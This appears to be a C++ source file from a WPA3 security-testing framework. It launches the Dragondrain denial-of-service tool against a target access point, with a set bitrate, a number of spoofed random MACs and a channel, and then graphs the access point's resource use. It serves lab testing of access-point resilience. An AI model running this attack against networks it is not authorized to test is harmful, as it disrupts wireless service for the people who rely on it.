#include "attacks/components/setup_connections.h"
#include "attacks/DoS_soft/channel_switch/channel_switch.h"

#include "config/global_config.h"
#include "ex_program/external_actors/ExternalConn.h"
#include "ex_program/hostapd/hostapd.h"
#include "observer/observers.h"
#include "observer/resource_checker.h"
#include "system/hw_capabilities.h"

namespace wpa3_tester::dragondrain{
    using namespace std;
    using namespace filesystem;
    using namespace Tins;
    using namespace chrono;

    //TODO setup
    //check ath_masker
    // check dragondrain_folder

    auto start_dragondrain(RunStatus &rs, const string &actor_name, const string &iface, const string &target_mac,
                           const string &channel, const nlohmann::json &att_cfg)->void{
        const int bitrate = att_cfg.at("bitrate").get<int>();
        const int num_random_mac = att_cfg.at("number_of_random_mac").get<int>();
        const int r = att_cfg.at("r").get<int>();

        vector<string> command = {};
        observer::add_nets(rs, command, actor_name);
        const string dragondrain_folder = get_global_config().at("paths").at("dragondrain").at("dragondrain_folder");
        command.insert(command.end(), {
            dragondrain_folder + "/src/dragondrain",
            "-d", iface,
            "-a", target_mac,
            "-c", channel,
            "-b", to_string(bitrate),
            "-n", to_string(num_random_mac),
            "-M", "100",
            "-r", to_string(r)
        });
        rs.process_manager.run(actor_name, command, dragondrain_folder);
    }

    void setup_attack(RunStatus &rs) {
        components::client_ap_attacker_setup(rs);

        //check ath_maker module
        const string ath_folder = get_global_config().at("paths").at("dragondrain").at("ath_folder");
        hw_capabilities::run_in("bash ./load.sh", ath_folder);
    }

    void run_attack(RunStatus& rs) {
        rs.start_observers();
        const auto& att_cfg = rs.config.at("attack_config");
        const auto attacker = rs.get_actor("attacker");

        const auto ap = rs.get_actor("access_point");
        const string target_mac = ap["mac"];
        const string channel = ap["channel"];

        this_thread::sleep_for(seconds(10));
        start_dragondrain(rs, "attacker", attacker["iface"], target_mac, channel, att_cfg);
        this_thread::sleep_for(seconds(att_cfg.at("timeout_sec").get<int>()));
        rs.process_manager.stop("attacker");
        this_thread::sleep_for(seconds(30));
        ap->conn->disconnect();
    }

    void stats_attack(const RunStatus &rs){
        // generate graph with ob
        const auto ap = rs.config.at("actors").at("access_point");
        observer::resource_checker::create_graph(rs, ap.at("source").get<string>());
    }
}
